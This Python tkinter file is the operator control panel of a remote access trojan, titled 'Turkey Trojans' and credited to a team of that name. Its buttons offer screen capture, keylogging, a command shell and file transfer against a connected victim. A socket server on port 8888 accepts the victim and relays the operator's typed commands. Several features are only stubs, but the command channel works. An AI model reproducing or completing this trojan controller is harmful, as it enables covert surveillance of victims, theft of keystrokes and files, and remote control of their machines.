#coding = unicode
import tkinter as tk
import tkinter.messagebox
import time
import threading
import socket
from tkinter import *
import tkinter.scrolledtext

global flag
global send_input
global share_input
global share_output

#GUI界面
class GUI_SERVER:
	def __init__(self):
		self.go( )

	def go(self):
		global bs_num #start点击次数的控制
		bs_num = 0
		global kb_num #键盘记录功能点击次数的控制
		kb_num = 0
		global ci_num #截屏功能点击次数的控制
		ci_num = 0
		global ftp_num #文件传输功能点击次数的控制
		ftp_num = 0
    	
    	#functions
    	#开启线程交互
		def start(): 
			global bs_num
			if bs_num != 0:
				s_error_message = ">>>>You have started!Don't do that again<<<<"
				self.text.insert('end',s_error_message+'\n')

			elif bs_num == 0:
				start_message = "--------------------------all the functions can be used now--------------------------"
				self.text.insert('end',start_message+'\n')
				bs_num += 1

				self.thr = Server(self.text,self.e,self.btn_submit)  
				self.thr.setDaemon(True)
				self.thr.start()
				self.text.insert('end', ">>>>线程开始<<<<\n")


		#text输入框的提交
		def submit():
			self.btn_submit.config(state='disabled')
			share_input = self.e.get() 
			
			var = self.e.get()+'\n'
			self.text.insert('end',var)
			self.e.delete(0,END)


		#清除记录text框内容
		def clear():
			self.text.delete(0.0,END)

		#截图功能界面
		def Capture():
			Capture_top = tk.Toplevel()
			Capture_top.title('Capturing images...')
			Capture_top.geometry('300x150')
			Label(Capture_top,text='Wait me for 10 seconds',font= ('Arial',12)).place(x=60,y=50)	
			
			##首先发送一个截图控制信号
			##从线程获得一个回复信号，如果截图完成，打印信号在text中。
			##	
			

		#键盘记录功能界面
		def kblog():
			def kblog_quit():
				choose = tk.messagebox.askyesno('Quit', 'really stop?')
				if choose:
					##发送一个quit给客户端
					kblog_top.destroy()
					##获得回复信号，打印成功消息在text中。
					self.btn_kblog.config(state = 'normal')


			kblog_top = tk.Toplevel()
			kblog_top.title("Keyboard is being logged...")
			kblog_top.geometry('400x300')

			kb_l = tk.Label(kblog_top, font = ("Arial",12),width=40, text='Logging...If you want to stop, click the button')
			kb_l.place(x=10,y=80)
			
			btn_stop = Button(kblog_top, text='Stop',width = 10, height = 2,command =kblog_quit)
			btn_stop.place(x=150,y=150)
			kblog_top.mainloop()

		#文件传输功能界面
		def ftp():
			def f_submit():
				if var.get()=='1':
					tk.messagebox.showinfo(title='success',message='send success')
				elif var.get()=='2':
					tk.messagebox.showinfo(title='success',message='Recieve success')
				else:
					tk.messagebox.showerror(title='success',message='failed'+var.get())

			def send():
				pass


			def rev():
				pass

			#file_init
			ftp_top = tk.Toplevel()
			ftp_top.title("make your choice")
			ftp_top.geometry('400x300')
			var = tk.StringVar()
			
			#file_Radiobutton
			f_r1 = tk.Radiobutton(ftp_top, text='Send',font = ("Arial",12),variable=var, value='1',width = 10, height = 2,command = send)
			f_r1.place(x=80,y=30)
			f_r2 = tk.Radiobutton(ftp_top, text='Recieve',font = ("Arial",12),variable=var, value='2',width = 10, height = 2, command = rev)
			f_r2.place(x=180,y=30)

			#file_label
			f_l = tk.Label(ftp_top, width=20, text='Destination:')
			f_l.place(x=10,y=100)
			f_l2 = tk.Label(ftp_top, width=20, text='Source:')
			f_l2.place(x=10,y=150)

			f_l3 = tk.Label(ftp_top, width=50, text='If you choose Recieve, you only need to write Source')
			f_l3.place(x=30,y=200)		

			#file_entry
			var_input_1 = tk.StringVar()
			var_input_2 = tk.StringVar()

			fe_1 = tk.Entry(ftp_top, textvariable=var_input_1, borderwidth = 5, width = 30)
			fe_1.place(x=125, y=100)
			fe_2 = tk.Entry(ftp_top, textvariable=var_input_2, borderwidth = 5, width = 30)
			fe_2.place(x=125, y=150)

			#file_button
			f_sub = tk.Button(ftp_top, text='submit',command = f_submit)
			f_sub.place(x=180, y=240)



			ftp_top.mainloop()
			

		#主界面
		#initials
		global share_output
		global flag
		flag = 0

		self.window = tk.Tk();
		self.window.title('Turkey Trojans__main page')
		self.window.geometry('500x600')

		self.canvas_m = tk.Canvas(self.window, height=300, width=1500)#创建画布
		self.image_file = tk.PhotoImage(file='turkey.png')#加载图片文件
		self.image_m = self.canvas_m.create_image(0,0, anchor='nw', image=self.image_file)#将图片置于画布上
		self.canvas_m.pack(side='top')#放置画布（为上端）

		#label
		self.ml1 = tk.Label(self.window, text='Made by @Turkey_Team').place(x = 250, y = 10)
		self.ml2 = tk.Label(self.window, text='Functions:', font=('Arial', 20), height=2).place(x=250, y= 80)#label for username
		self.ml3 = tk.Label(self.window, text='Input:',font = ('Arial',12)).place(x=10, y= 249)#label for input
		self.ml4 = tk.Label(self.window, text='Click to clear text content:').place(x=250, y= 50)#label for password


		#button
		self.btn_capture = tk.Button(self.window, text='CaptureImage',command=Capture)
		self.btn_capture.place(x=250, y=150)
		self.btn_cmd = tk.Button(self.window, text='Open CmdShell')
		self.btn_cmd.place(x=250, y=190)
		self.btn_kblog = tk.Button(self.window, text='KeyboardLog',command=kblog)
		self.btn_kblog.place(x=360, y=150)
		self.btn_ftp = tk.Button(self.window, text='Transfer Files',command = ftp)
		self.btn_ftp.place(x=360, y=190)
		self.btn_submit = tk.Button(self.window,text = "submit",command=submit)
		self.btn_submit.place(x=430, y=250)
		self.btn_clear = tk.Button(self.window, text ="Clear", command = clear)
		self.btn_clear.place(x=420,y=50)
		self.btn_start = tk.Button(self.window, text = "start", command = start)
		self.btn_start.place(x=420,y=8)


		#entry
		self.var_input = tk.StringVar()
		self.e = tk.Entry(self.window, textvariable=self.var_input, borderwidth = 5, width = 50)
		self.e.place(x=60, y=250)

		#scroll text
		self.frame = tk.Frame(self.window)  
		self.frame.pack()
		self.text_scroll_y = tk.Scrollbar(self.frame, orient=VERTICAL)  #文本框-竖向滚动条  
		self.text =tk.Text(self.frame, yscrollcommand=self.text_scroll_y.set,wrap='none', font=("Arial",12))  
		self.text_scroll_y.config(command=self.text.yview)
		self.text_scroll_y.pack(fill="y", expand=0, side=RIGHT, anchor=N)  
		self.text.pack()

		self.temp_output = 0
		global share_output
		share_output = 0
		if (self.temp_output != share_output):
			self.temp_output = share_output
			self.text.insert('end',self.temp_output)

		self.window.mainloop();


class Server(threading.Thread):
    def __init__(self,out,e_input,btn_s):
        threading.Thread.__init__(self)
        self.addr = '127.0.0.1'
        self.port = 8888       #要改
        self.temp_input = 0	   #初始化，确定全局变量share_input是否被修改
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建socket对象。
        self.s.bind((self.addr, self.port))  # 绑定IP及端口
        self.stop_flag = False
        self.s.listen(5)  # 设置最大连接数，超过后排队
        self.btn_ss = btn_s
        self.out = out
        self.e_input = e_input

	        # 线程的任务，如果未结束一直循环任务

    def run(self):
    	self.clientSock, self.address = self.s.accept()
    	msg = self.clientSock.recv(1024)
    	print(msg.decode('gbk','ignore'))
    	self.out.insert('end',msg.decode('gbk','ignore'))

    	t1 = threading.Thread(target=self.recvMsgThread,args=(self.out,self.e_input))
    	t2 = threading.Thread(target=self.sendMsgThread,args=(self.out,self.e_input,self.btn_ss))
    	t1.start()
    	t2.start()
    	t1.join()
    	t2.join()

    #发送消息线程方法
    def sendMsgThread(self,s_out,s_e_input,btn_ss):
        self.s_out = s_out
        self.s_e_input = s_e_input
        self.btn_sss = btn_ss
        temp_data = ""
        print('发消息线程启动------------', self.stop_flag)
        while not self.stop_flag:
        	data = self.s_e_input.get()
        	if data != "" and data != temp_data:
        		temp_data = data

        	if self.btn_sss["state"] == 'disabled':
	            
	            if data == 'EXIT':#输入exit退出客户端
	                msg = 'EXIT'
	                self.clientSock.send(msg.encode())
	                time.sleep(1)
	                self.stop()  # 中止线程
	                print('发消息线程已关闭')
	                
	            elif temp_data:
	                iii = self.clientSock.send(temp_data.encode())
	                self.btn_sss.config(state = 'normal')
	                print(temp_data+" success")
	                if iii == False:
	                	print("flase flase")


    # 接收消息线程方法
    def recvMsgThread(self,r_out,r_e_input):
        self.r_out = r_out
        self.r_e_input = r_e_input
        print('收消息线程启动-------------', self.stop_flag)
        aaa = 0
        while not self.stop_flag:
            try:
                msg = self.clientSock.recv(2048)
                if msg:
                	self.r_out.insert('end',msg.decode('gbk','ignore'))
                	print(msg.decode('gbk','ignore'))
                			
                	
                	

            except Exception as e:
            	if aaa == 0:
            		print('收消息线程已关闭')
            		aaa += 1

    def stop(self):
        self.s.close()
        self.stop_flag = True

    
if __name__ == '__main__':
    server = GUI_SERVER()



